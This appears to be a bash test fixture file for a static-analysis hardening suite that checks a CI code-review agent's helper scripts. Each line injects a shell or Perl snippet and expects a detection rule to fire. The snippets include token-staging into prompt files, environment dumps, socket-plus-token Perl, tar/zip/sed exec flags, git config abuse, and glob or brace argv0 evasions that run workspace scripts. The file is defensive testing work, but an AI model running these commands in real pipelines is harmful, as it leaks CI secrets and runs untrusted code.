# Hardening suite part 2/4 (sourced by semgrep-sarif-hardening.test.sh):
# interpreters, indirection, aliases, namerefs, command files.
# Uses t/FS/RS/S/H/I/R/O/PR from the lib.
# shellcheck shell=bash disable=SC2154
# --- perl opens (paren-free, sysopen) ---
t helper-perl-openfree 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}open my \$fh2, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\"; close \$fh2;"
t helper-perl-sysopen 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}sysopen(FH2, \$f, O_RDWR);"

# --- workspace writes (token staging) ---
t helper-ws-redirect 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf '%s' \"\${GH_TOKEN}\" > \"\${GITHUB_WORKSPACE}/review-token\""

# --- agent argv (value-boundary, scrub exactness, model shape) ---
t runner-model-glue 1 "agent-shell-boundary" happy.sarif "$R${FS}  --disable-shell \\${FS}r${FS}--disable-shell${FS}--model \"--disable-shell --disable-write\""
t runner-scrub-glue 1 "agent-token-isolation" happy.sarif "$R${FS}env -u GITHUB_TOKEN -u GH_TOKEN${FS}r${FS}-u GITHUB_TOKEN${FS}-u GITHUB_TOKEN=foo"
t runner-model-args 1 "agent-model-args" happy.sarif "$R${FS}model_args+=(--model${FS}a${FS}  model_args+=(--enable-x)"
t runner-unknown-flag 1 "agent-unknown-flag" happy.sarif "$R${FS}  --no-session-log \\${FS}a${FS}  --frobnicate \\"
t runner-model-eq-fp 0 "" happy.sarif "$R${FS}  --max-model-steps 35 \\${FS}r${FS}--max-model-steps 35${FS}--max-model-steps=35"

# --- code loaders (Codex P1: make -C workspace) ---
t loader-make 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}make -C \"\${GITHUB_WORKSPACE}\" all"
t loader-cmake 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cmake -S \"\${GITHUB_WORKSPACE}\" -B /tmp/b"
t loader-docker 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}docker run -v \"\${GITHUB_WORKSPACE}:/w\" evil"
t loader-gmake 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gmake -C /tmp x"
t loader-path 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/make -C /tmp x"
t loader-xargs 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf 'x' | xargs make -C /tmp"
t loader-lua 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}lua -e \"os.execute(1)\""
t loader-npx 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}npx -y evil"
t loader-cargo 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cargo run --manifest-path /tmp/x"
t wrapper-parallel 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}parallel git clone {} ::: evil"
t wrapper-flock 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}flock /tmp/l make -C /tmp"
# --- unmodeled wrappers (Codex P1: fakeroot/xvfb-run operands) ---
t wrapper-fakeroot 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}fakeroot bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-xvfb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}xvfb-run bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-prlimit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}prlimit -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-timeout 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}timeout 10 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-setarch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}setarch x86_64 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-linux32 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}linux32 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-dbus 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-run-session -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-dbus-launch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-launch --exit-with-session bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-ssd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/sbin/start-stop-daemon --start --name museevil --startas /bin/bash -- \"\${GITHUB_WORKSPACE}/evil.sh\""

# --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
t git-commit-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git commit -m x"
t git-checkout-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git checkout evil"
t git-fetch-remote-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch evil \"\${base_sha_full}\""
t git-fetch-pack-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch --upload-pack=evil origin abc123"
t git-fetch-origin-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch --depth 1 origin \"\${base_sha_full}\""
t git-diff-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c core.quotePath=false diff -z --name-status a b"
t git-show-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git show \"\${MUSE_BASE_SHA_FULL}:f\""
t git-mergebase-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git merge-base a b"
t git-c-evil-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c protocol.ext.allow=always fetch origin x"
t git-c-glue-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -cprotocol.ext.allow=always status"
t git-C-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -C /tmp status"
t git-execpath-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git --exec-path=/tmp/evil log"
t git-configenv-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git --config-env=alias.x=EVIL status"
t git-config-write-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config --global core.pager evil"
t git-config-read-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config user.email"
t git-config-edit-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config --edit"
t git-diff-output-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c core.quotePath=false diff --output=\"\${SCRIPT_DIR}/x\" a b"
t git-diff-textconv-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git diff --textconv a b"

# --- find file effects (-delete, -fls/-fprint targets) ---
t find-delete-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -delete"
t find-fls-trusted-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -fls \"\${SCRIPT_DIR}/x\""
t find-fls-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -fls /tmp/x"

# --- awk program content (system, pipe-getline, program redirects) ---
t awk-system-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{system(\"id\")}' /dev/null"
t awk-pipe-getline-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '\"id\" | getline x' /dev/null"
t awk-print-pipe-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{print | \"sort\"}' /dev/null"
t awk-redirect-trusted-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{print \"x\" > \"\${SCRIPT_DIR}/evil\"}' /dev/null"
t awk-redirect-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{print \"x\" > \"/tmp/x\"}' /dev/null"
t awk-getline-file-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{getline x < \"/tmp/f\"}' /dev/null"
t awk-alt-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '/a|b/ {print}' /dev/null"
t awk-string-pipe-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{print \"a|b\"}' /dev/null"
# --- gawk directives (Codex P1: @include/@load operands) ---
t awk-include 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@include \"\${GITHUB_WORKSPACE}/evil.awk\"' </dev/null"
t awk-load 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@load \"\${GITHUB_WORKSPACE}/evil.so\"' </dev/null"
t awk-directive-string-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '{print \"@include\"}' /dev/null"
# --- dynamic program words (Codex P1: awk "$prog") ---
t awk-stale-prog 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v prog %s 'BEGIN { system(\"bash \" ENVIRON[\"\${GITHUB_WORKSPACE}\"] \"/evil.sh\") }'; awk \"\$prog\" </dev/null"

# --- installer TOCTOU (Codex P1: post-verify tmp_bin write) ---
t toctou-cat 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${tmp_bin}\""
t toctou-cp 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cp /tmp/evil \"\${tmp_bin}\""
t toctou-tee 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}printf evil | tee \"\${tmp_bin}\" >/dev/null"
t toctou-curl 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}curl -fsSL -o \"\${tmp_bin}\" https://evil/x"
t toctou-preverify-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}b${FS}cp /tmp/stage \"\${tmp_bin}\""
t toctou-reread-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}sha256sum \"\${tmp_bin}\" | awk '{print \$1}'"
t toctou-noverify 1 "muse-installer-no-verify" happy.sarif "$I${FS}got_sha=\"\$(sha256sum${FS}d"

# --- secret staging (Codex P1: token into agent inputs; env dumps) ---
t stage-token 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}echo \"\${GH_TOKEN}\" >> \"\${prompt_file}\""
t stage-token-group 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}b${FS}  echo \"token: \${GH_TOKEN}\""
t stage-bareword-fp 0 "" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}echo GH_TOKEN >> \"\${prompt_file}\""
t stage-substr 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GITHUB_TOKEN:0:4}\" >> /tmp/x"
# --- secret union (Codex P1: META_API_KEY, runtime tokens) ---
t secret-meta 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$META_API_KEY\" | rev"
t secret-runtime 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$ACTIONS_RUNTIME_TOKEN\" | rev"
t secret-idtoken 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" | rev"
t stage-suffix-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GH_TOKEN_SUFFIX:-none}\""
t stage-printenv 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printenv GH_TOKEN"
t stage-envdump 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env > /tmp/x"
t stage-envscrub-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env -u GITHUB_TOKEN -u GH_TOKEN \"/bin/echo\" hi > /tmp/x"
t stage-export-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export"
t stage-declare-p 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -p GH_TOKEN"
t stage-set-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}set"
# --- constructed dump flags (Codex P1: declare "$p") ---
t declare-constructed 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v p %s -p; declare \"\$p\" GH_TOKEN | rev"
t declare-assign-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare FOO=\"\$BAR\""
t stage-export-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export FOO=bar"
t stage-poison-git-ssh 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export GIT_SSH_COMMAND=/tmp/evil"
t stage-poison-pager 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PAGER=/tmp/evil"
t stage-poison-git-count 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_COUNT=1"
t stage-poison-git-dir 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_DIR=/tmp/evil"

# --- perl capability (Codex P1: IO::Socket + $ENV{GH_TOKEN} in ranges.pl) ---
t perl-use-socket 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}use IO::Socket::INET;"
t perl-env-token 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}print \$leak \$ENV{GH_TOKEN};"
t perl-socket-call 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}socket(my \$s, 2, 1, 6); connect(\$s, \$addr);"
t perl-use-constant 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}use constant FOO => 1;"
t perl-use-version-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}use v5.10;"
t perl-use-numeric-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}use 5.010;"
t perl-no-strict 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}no strict;"
t perl-disconnect-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$x = disconnect(\$s);"
t perl-method-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}\$s->connect(\$a);"
t perl-core-connect 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::connect(\$s, \$a);"
t perl-env-dynamic 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}print \$ENV{\$k};"
t perl-env-home-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$h = \$ENV{HOME};"
t perl-inline-use 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -e 'use IO::Socket::INET;'"
t perl-inline-env 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -0777 -pe 'print \$ENV{GH_TOKEN};'"
# --- versioned perl (Codex P1: perl5.38.2 dispatch) ---
t perl-versioned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl5.38.2 \"\${GITHUB_WORKSPACE}/evil.pl\""
t perl-target 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl5.38-x86_64-linux-gnu \"\${GITHUB_WORKSPACE}/evil.pl\""
t perl-perldoc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perldoc perlrun"

# --- installer tmp_bin aliases (Codex P1: replacement=$tmp_bin) ---
t toctou-alias 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}replacement=\"\${tmp_bin}\"${RS}$I${FS}replacement=\"\${tmp_bin}\"${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-pre 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}replacement=\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-chain 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}a=\"\${tmp_bin}\"${RS}$I${FS}a=\"\${tmp_bin}\"${FS}a${FS}b=\"\${a}\"${RS}$I${FS}b=\"\${a}\"${FS}a${FS}cat /tmp/evil > \"\${b}\""
t toctou-alias-inert-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}replacement=\"\${tmp_bin}\""
t toctou-alias-read 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}read replacement <<< \"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""
t toctou-alias-printfv 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}printf -v replacement '%s' \"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""
t toctou-alias-for 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}for replacement in \"\${tmp_bin}\"; do :; done${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""

# --- indirect token expansion (Codex P1: ${!secret_name}) ---
t stage-indirect 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}secret_name=GH_TOKEN; printf '%s' \"\${!secret_name}\" >> \"\${prompt_file}\""
t stage-indirect-sub 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!ref[0]}\""
t stage-indirect-keys-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!arr[@]}\""
t stage-indirect-prefix-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!GH_*}\""
t stage-singlequote-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo '\${GH_TOKEN}'"
t stage-singlequote-indirect-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo '\${!ref}'"

# --- varmap reassignment (Codex P1: loader+=ake staleness) ---
t varmap-plus-eq 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; loader+=ake; \"\${loader}\" -C \"\${GITHUB_WORKSPACE}\" all"
t varmap-declare 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; declare loader=make; \"\${loader}\" -C /tmp all"
t varmap-unset 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=make; unset loader; \"\${loader}\" -C /tmp all"
t varmap-indented 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m${RS}$H${FS}loader=m${FS}a${FS}  loader=make${RS}$H${FS}  loader=make${FS}a${FS}\"\${loader}\" -C /tmp all"
t varmap-arith 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; ((loader = 5)); \"\${loader}\" -C /tmp all"
t varmap-read 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; read loader < /dev/null; \"\${loader}\" -C /tmp all"
t varmap-printfv 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; printf -v loader '%s' x; \"\${loader}\" -C /tmp all"
t varmap-for 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; for loader in a b; do :; done; \"\${loader}\" -C /tmp all"
t varmap-multiassign 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=old; export ziplog=x loader=new; \"\${loader}\" -C /tmp all"
t varmap-cmdsubst-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\"\$(printf hi)\""

# --- varmap operators (Codex P1: ${v:0} computed argv0) ---
t varmap-substring 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cmd=bash; \"\${cmd:0}\" \"\${GITHUB_WORKSPACE}/evil.sh\""
t varmap-default-op 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cmd=bash; \"\${cmd:-sh}\" -c true"
t varmap-at-op 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${@}\" -c true"
t varmap-home-path-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${HOME}/.local/bin/muse\" --version"
t varmap-assign-op-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}note=\"\${note} [done]\""

# --- glob argv0 (Codex P1: b[as][as]h expands via workspace file) ---
t glob-argv0 1 "helper-unresolved-command" happy.sarif "new:bash${FS}#!/bin/sh${RS}$H${FS}set -euo pipefail${FS}a${FS}b[as][as]h \"\${GITHUB_WORKSPACE}/evil.sh\""
t glob-argv0-leading 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[bd]ash \"\${GITHUB_WORKSPACE}/evil.sh\""
t glob-argv0-star 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}*.sh"
t glob-argv0-assign 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}b[as]h=x"
t glob-argv0-env 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env -u FOO b[as]h evil.sh"
t glob-argv0-xargs 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf 'x\n' | xargs b[as]h"
t glob-argv0-timeout 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}timeout 5 b[as]h evil.sh"
t glob-argv0-subshell 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}(b[as]h evil.sh)"
t glob-argv0-casebody 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}case \$x in a) b[as]h evil.sh;; esac"
t glob-argv0-test-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[ -n \"\$x\" ]"
t glob-argv0-dtest-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ \$x == foo* ]]"
t glob-argv0-arith-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}((count*=2))"
t glob-argv0-case-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}case \$x in *.sh|*.py) echo hi;; esac"
t glob-argv0-arr-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}arr[0]=x"

# --- predefined shell vars (Codex P1: ${BASH} in argv0) ---
t varmap-bash 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${BASH}\" \"\${GITHUB_WORKSPACE}/evil.sh\""
t varmap-shell 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\$SHELL -c true"
# --- brace expansion in argv0 (Codex P1: {bash,evil.sh}) ---
t varmap-brace 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}{bash,evil.sh}"
t varmap-brace-single-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}{a}"

# --- CORE-qualified perl calls (Codex P1: CORE::open) ---
t perl-core-open 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::open(my \$fh, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\");"
t perl-core-sysopen 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::sysopen(my \$fh, \$f, O_RDWR);"
t perl-core-system 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::system(\"id\");"
t perl-amp-open 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}&open(my \$fh, \"|-\", \"id\");"
t perl-foo-open-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}Foo::open(my \$fh, \"|-\", \"id\");"

# --- copy-class exec flags (Codex P1: tar --checkpoint-action, sed e) ---
t copy-tar-checkpoint 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/out.tar --checkpoint=1 --checkpoint-action=exec='bash \${GITHUB_WORKSPACE}/evil.sh' /dev/null"
t copy-tar-tocommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x --to-command=/bin/sh /dev/null"
t copy-tar-compress 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x -I evil /dev/null"
t copy-tar-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/out.tar /dev/null"
# --- tar remote shell + implicit extraction (Codex P1s) ---
t copy-tar-rsh 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar --rsh-command=\"\${GITHUB_WORKSPACE}/evil.sh\" -cf localhost:/tmp/x.tar /etc/hostname"
t copy-tar-rmt 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar --rmt-command=\"\${GITHUB_WORKSPACE}/evil.sh\" -cf localhost:/tmp/x.tar /dev/null"
t copy-tar-noC 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -xf \"\${GITHUB_WORKSPACE}/evil.tar\""
t copy-tar-C-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -xf \"\${GITHUB_WORKSPACE}/evil.tar\" -C \"\${RUNNER_TEMP}\""
# --- zip test command (Codex P1: -TT executes) ---
t copy-zip-TT 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T -TT \"bash \${GITHUB_WORKSPACE}/evil.sh\" \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
t copy-zip-T-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
# --- unzip destination (Codex P1: no -d extracts to CWD) ---
t copy-unzip-noD 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unzip -o \"\${GITHUB_WORKSPACE}/evil.zip\""
t copy-unzip-d-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unzip -o \"\${GITHUB_WORKSPACE}/evil.zip\" -d \"\${RUNNER_TEMP}\""
t copy-sed-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/e' /tmp/f"
t copy-sed-e-cmd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -e '/pat/e' /tmp/f"
t copy-sed-w-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 'w \${SCRIPT_DIR}/x' /tmp/f"
t copy-sed-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/g' /tmp/f"
t copy-sed-f-unpinned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -f \"\${GITHUB_WORKSPACE}/evil.sed\" /tmp/f"
t copy-ed-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf 'w\nq\n' | ed /tmp/f"

# --- symlink-alias writes (Codex P1: ln -s SCRIPT_DIR) ---
t link-alias-write 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s \"\${SCRIPT_DIR}\" /tmp/review-scripts${RS}$H${FS}ln -s \"\${SCRIPT_DIR}\"${FS}a${FS}cp \"\${GITHUB_WORKSPACE}/evil.sh\" /tmp/review-scripts/diff.sh"
t link-src-relative 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s ../scripts/x /tmp/l"
